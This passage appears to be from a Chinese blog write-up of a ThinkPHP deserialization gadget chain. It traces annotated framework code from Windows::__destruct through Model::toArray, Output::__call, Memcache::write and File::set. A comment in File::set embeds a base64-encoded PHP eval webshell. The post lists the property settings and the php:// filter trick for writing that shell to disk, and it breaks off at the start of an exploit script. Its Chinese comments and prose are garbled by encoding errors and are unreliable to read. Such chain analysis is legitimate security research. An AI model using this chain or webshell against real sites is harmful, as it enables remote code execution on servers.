<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$item</span>    = [];</span><br><span class="line">       <span class="variable">$visible</span> = [];</span><br><span class="line">       <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">       <span class="variable">$data</span> = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation); <span class="comment"># åˆå¹¶ä¸¤ä¸ªæ•°ç»„</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// è¿‡æ»¤å±æ€§</span></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;visible)) &#123; <span class="comment"># å¦‚æœ$this-&gt;visibleä¸ä¸ºç©º</span></span><br><span class="line">           <span class="comment"># å¦‚æœæ˜¯æ¯”è¾ƒç®€å•çš„æ ¼å¼åˆ™åªä¼šè¿”å›å€¼ï¼Œè‹¥å€¼æ˜¯æ•°ç»„åˆ™è¿”å›é”®ï¼Œè‹¥æ˜¯a.bçš„æ ¼å¼ï¼Œä¼šè¿”å›a ($this-&gt;visibleçš„å†…å®¹)</span></span><br><span class="line">           <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">           <span class="comment"># array_intersect_key ä½¿ç”¨é”®åæ¯”è¾ƒè®¡ç®—æ•°ç»„çš„äº¤é›† è¿”å›å‰é¢æ•°ç»„çš„å†…å®¹</span></span><br><span class="line">           <span class="comment"># array_flip äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼</span></span><br><span class="line">           <span class="variable">$data</span>  = array_intersect_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">           <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">           <span class="comment"># æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„çš„å·®å€¼</span></span><br><span class="line">           <span class="variable">$data</span>  = array_diff_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123; <span class="comment"># éå†</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">               <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">               <span class="comment"># å†æ‰§è¡Œä¸€è¾¹toArray åœ¨æ€è€ƒelseifé‡Œé¢å¯ä»¥ä¸å¯ä»¥è§¦å‘__callé­”æœ¯æ–¹æ³•</span></span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (is_array(<span class="variable">$val</span>) &amp;&amp; reset(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">               <span class="comment">// å…³è”æ¨¡å‹æ•°æ®é›†</span></span><br><span class="line">               <span class="variable">$arr</span> = [];</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                   <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// æ¨¡å‹å±æ€§ ç›´æ¥è¿”å›$this-&gt;data </span></span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123; <span class="comment"># å¦‚æœ$this-&gt;appendä¸ä¸ºç©º</span></span><br><span class="line">           <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123; <span class="comment"># éå†</span></span><br><span class="line">               <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123; <span class="comment"># å¦‚æœæ˜¯æ•°ç»„</span></span><br><span class="line">                   <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)-&gt;toArray();</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                   <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])-&gt;toArray();</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="variable">$relation</span> = Loader::parseName(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>); <span class="comment"># ç›´æ¥è¿”å›$name</span></span><br><span class="line">                   <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                       <span class="variable">$modelRelation</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$relation</span>(); <span class="comment"># æ‰§è¡Œ$nameå‡½æ•° è¿”å›ä¸€ä¸ªç±» $this-&gt;error</span></span><br><span class="line">                       <span class="variable">$value</span>         = <span class="keyword">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>); <span class="comment"># è¿”å›$this-&gt;parent </span></span><br><span class="line">                       <span class="comment"># Output</span></span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123; <span class="comment"># ç±»é‡Œé¢è¦å­˜åœ¨getBindAttræ–¹æ³•</span></span><br><span class="line">                           <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;getBindAttr(); <span class="comment"># æ‰§è¡Œ è¿”å›ä¸€ä¸ªæ•°ç»„</span></span><br><span class="line">                           <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123; <span class="comment">#$this-&gt;bindAttr = [&#x27;aaa&#x27;]</span></span><br><span class="line">                               <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123; <span class="comment"># éå†</span></span><br><span class="line">                                   <span class="variable">$key</span> = is_numeric(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>; <span class="comment"># åˆ¤æ–­</span></span><br><span class="line">                                   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123; </span><br><span class="line">                                       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                       <span class="comment"># ä¸è¦å­˜åœ¨</span></span><br><span class="line">                                       <span class="comment"># $valueæœ‰å€¼ç„¶åç›´æ¥æ‰§è¡Œæ–¹æ³• getAttræ–¹æ³•å¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Œä½†æ˜¯å¯ä»¥åœ¨è¿™é‡Œåˆ©ç”¨</span></span><br><span class="line">                                       <span class="comment"># ç„¶åè°ƒç”¨__callæ–¹æ³•(Output)</span></span><br><span class="line">                                       <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;getAttr(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                   &#125;</span><br><span class="line">                               &#125;</span><br><span class="line">                               <span class="keyword">continue</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;isSelfRelation() &amp;&amp; get_class(<span class="variable">$modelRelation</span>-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">           <span class="comment"># è¦æ±‚$this-&gt;parentä¸ºtrueï¼Œä¸”ä¸ºéè‡ªå…³è” è¦æ±‚(Query)$this-&gt;model=(Model)$this-&gt;parent ç„¶åç›´æ¥è¿”å›$this-&gt;parent</span></span><br><span class="line">           <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// é¦–å…ˆè·å–å…³è”æ•°æ®</span></span><br><span class="line">           <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getRelation&#x27;</span>)) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="variable">$modelRelation</span>-&gt;getRelation();</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;method not exists:&#x27;</span> . get_class(<span class="variable">$modelRelation</span>) . <span class="string">&#x27;-&gt; getRelation&#x27;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>3.<code>__call</code></p>
<p>åœ¨<code>OutPut</code>ç±»æ‰¾åˆ°å¯èƒ½å¯ä»¥åˆ©ç”¨çš„ï¼Œå…¶ä»–çš„éƒ½è¾ƒéš¾åˆ©ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># method=getAttr args=$attr</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;styles)) &#123;<span class="comment"># $this-&gt;styles = [&#x27;getAttr&#x27;]</span></span><br><span class="line">            array_unshift(<span class="variable">$args</span>, <span class="variable">$method</span>); <span class="comment"># åœ¨æ•°ç»„$argså‰é¢æ’å…¥$method</span></span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>); <span class="comment"># è¿™ä¸ªç±»é‡Œçš„blockæ–¹æ³•</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="keyword">__CLASS__</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¯¹<code>block</code>æ–¹æ³•è¿›è¡Œè¿½è¸ªï¼Œè¿™é‡Œè¦çŸ¥é“<code>$method=getAttr $args=$key</code>ï¼ˆå‰é¢è°ƒç”¨çš„ æ‰€ä»¥ç¬¬äºŒä¸ªifè¯­å¥æ˜¯ä¸å¯åˆ©ç”¨çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># style=getAttr $message=$attr</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeln(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$newline</span> = <span class="literal">false</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;write(<span class="variable">$messages</span>, <span class="variable">$newline</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›´æ¥åœ¨è¿™é‡Œæœç´¢writeçš„å®šä¹‰çš„æ—¶å€™ä¼šè½¬åˆ°Consoleç±»é‡Œé¢çš„ï¼Œä½†æ˜¯è¿½è¸ªä¹‹åä¼šå‘ç°æ²¡æœ‰ä»»ä½•å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œè€Œè¿™é‡Œçš„$this-&gt;handleæ˜¯æˆ‘ä»¬å¯éšæ„æ”¹å˜çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å…¨å±€æœç´¢æ˜¯å¦æœ‰å¯åˆ©ç”¨çš„writeæ–¹æ³•</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åœ¨<code>Memcache</code>ä¸­æ‰¾åˆ°è‡³å°‘æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„<code>write</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># $sessID=$attr $sessData=false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æœç´¢å¯åˆ©ç”¨çš„setæ–¹æ³•ï¼Œæ‰¾äº†ä¸€åœˆä¸‹æ¥å‘ç°setçŠ¯æ³•éƒ½æ˜¯ä¸‰ä¸ªå‚æ•°ï¼Œä½†æ˜¯phpæ˜¯ä¸åœ¨ä¹å‚æ•°å¤šå°‘çš„</p>
<p><img src="https://img-blog.csdnimg.cn/9968013731d148989a715b159656e7b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>åœ¨<code>File</code>ç±»ä¸­æ‰¾åˆ°ä¼¼ä¹å¯ä»¥åˆ©ç”¨çš„<code>file_put_contents</code>ï¼Œè€Œdataæ‹¼æ¥é‡Œé¢å­˜åœ¨exitï¼Œè¿™ç§ç±»å‹çš„ä»¥å‰æ˜¯é‡åˆ°è¿‡çš„ï¼Œç›´æ¥åœ¨filenameé‚£é‡Œç”¨phpä¼ªåè®®ç»•è¿‡å°±å¥½äº†ï¼Œè€ŒåŒæ—¶è¦æŠŠæˆ‘ä»¬è¦å†™å…¥çš„ä¸€å¥è¯è¿›è¡Œbase64åŠ å¯†ï¼ŒåŒæ—¶ä¸èƒ½è®©æ•°æ®è¢«å‹ç¼©ï¼Œæ‰€ä»¥<code>$this-&gt;options[&#39;data_compress&#39;]</code>è¦ä¸ºfalseï¼Œç„¶ååªè¦æ–‡ä»¶å†™å…¥æˆåŠŸäº†å°±å¥½äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># $name=$attr $value=false $expire=0</span></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) &#123; <span class="comment"># $expire=0</span></span><br><span class="line">            <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;getTimestamp() - time();</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment"># $nameå¯æ§ getCacheKeyå¯¹$nameè¿›è¡Œmd5åŠ å¯†ï¼Œç„¶ååŠ ä¸Šphpåç¼€å¹¶åˆ›å»ºæ–‡ä»¶ç›®å½•</span></span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>, <span class="literal">true</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = serialize(<span class="variable">$value</span>); <span class="comment"># ç¬¬ä¸€éä¸­çš„valueä¸å¯æ§ ç”±ç¬¬äºŒæ¬¡ä¸º PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>); <span class="comment"># å¯ä»¥åˆ©ç”¨phpä¼ªåè®®ç»•è¿‡exit</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem(<span class="variable">$filename</span>);</span><br><span class="line">            clearstatcache();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = md5(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨å­ç›®å½•</span></span><br><span class="line">            <span class="variable">$name</span> = substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . substr(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$dir</span>      = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) &#123;<span class="comment"># $this-&gt;tagå¯æ§</span></span><br><span class="line">            <span class="variable">$key</span>       = <span class="string">&#x27;tag_&#x27;</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has(<span class="variable">$key</span>)) &#123;</span><br><span class="line">                <span class="variable">$value</span>   = explode(<span class="string">&#x27;,&#x27;</span>, <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>));</span><br><span class="line">                <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">                <span class="variable">$value</span>   = implode(<span class="string">&#x27;,&#x27;</span>, array_unique(<span class="variable">$value</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;set(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>); <span class="comment"># ç¬¬äºŒæ¬¡è¿›å…¥get $value=$name å¯æ§ æ‰€ä»¥è¦æŠŠè¦å†™å…¥çš„å†…å®¹ä¹Ÿç›´æ¥å†™è¿›$pathä¸­</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ€è·¯æ•´ç†ï¼š</p>
<blockquote>
<p>1.é¦–å…ˆä»Windowsç±»çš„__destructæ–¹æ³•å¼€å§‹ï¼Œè°ƒç”¨removeFilesæ–¹æ³•ï¼Œå½“å¯¹$this-&gt;filesè¿›è¡Œfile_exitsè¿›è¡Œåˆ¤æ–­çš„æ—¶å€™è§¦å‘toStringæ–¹æ³•</p>
<p>2.åœ¨Modelç±»ä¸­æ‰¾åˆ°toStringæ–¹æ³•ï¼Œä¾æ—§æ˜¯jsonè°ƒç”¨toArray ï¼Œåœ¨è¿™é‡Œå¯ä»¥å®ç°å¯¹__callæ–¹æ³•çš„è°ƒç”¨ï¼Œè¦æ±‚this-&gt;appendæ•°ç»„ä¸ä¸ºç©ºï¼Œå¹¶ä¸”æ•°ç»„é‡Œé¢çš„å€¼ä¸èƒ½æ˜¯æ•°ç»„çš„ç±»å‹ï¼Œä¹Ÿä¸èƒ½å­˜åœ¨<code>.</code>ï¼Œåœ¨æ‰§è¡Œå€¼æ‰€ä»£è¡¨çš„æ–¹æ³•çš„æ—¶å€™ä¼šè¿”å›ä¸€ä¸ªç±»ä¸”è¿™ä¸ªç±»é‡Œé¢å­˜åœ¨getBindAttrè¿™ä¸ªæ–¹æ³•ï¼Œè€Œåé¢è¿˜æœ‰value=new Output()ï¼Œæ‰€ä»¥ append[]=â€™getErrorâ€™ this-&gt;error= OneToOneå’ŒQueryçš„å­ç±»; this-&gt;parent=new Output();(Query)this-&gt;model = new Output(); </p>
<p>è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªçŸ›ç›¾ï¼Œæˆ‘ä»¬è¦æ±‚modelRelation å¯ä»¥è°ƒç”¨ getBindAttrï¼Œé‚£modelRelation æœ€å¥½æ˜¯OneToOneï¼Œä½†æ˜¯åœ¨getRelationDataæ–¹æ³•ä¸­æˆ‘ä»¬è¦åˆ©ç”¨modelRelation å»è°ƒç”¨modelæ–¹æ³•ï¼Œè€Œæ­¤æ—¶è¦ç”¨Queryç±»ï¼Œé‚£ä¹ˆåªèƒ½æ‰¾OneToOneå’ŒQueryçš„å­ç±»çš„</p>
<p>3.Outputé‡Œé¢çš„__callæ–¹æ³•ï¼Œè¦æ±‚this-&gt;styles = [â€˜getAttrâ€™]; this-&gt;handle=new Memcache();</p>
<p>4.Memcacheç±»ä¸­çš„writeæ–¹æ³•ï¼Œthis-&gt;handle=new File();ä»è€Œè°ƒç”¨Fileç±»é‡Œé¢çš„setæ–¹æ³•ï¼Œthis-&gt;options[â€˜cache_subdirâ€™]=falseï¼›this-&gt;options[â€˜prefixâ€™]=false;$this-&gt;options[â€˜pathâ€™]=(phpä¼ªåè®®);this-&gt;options[â€˜data_compressâ€™]=false;</p>
</blockquote>
<p>ç½‘ä¸Šæ‰¾çš„exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="variable">$files</span>]; <span class="comment">//$file =&gt; /think/Modelçš„å­ç±»new Pivot(); 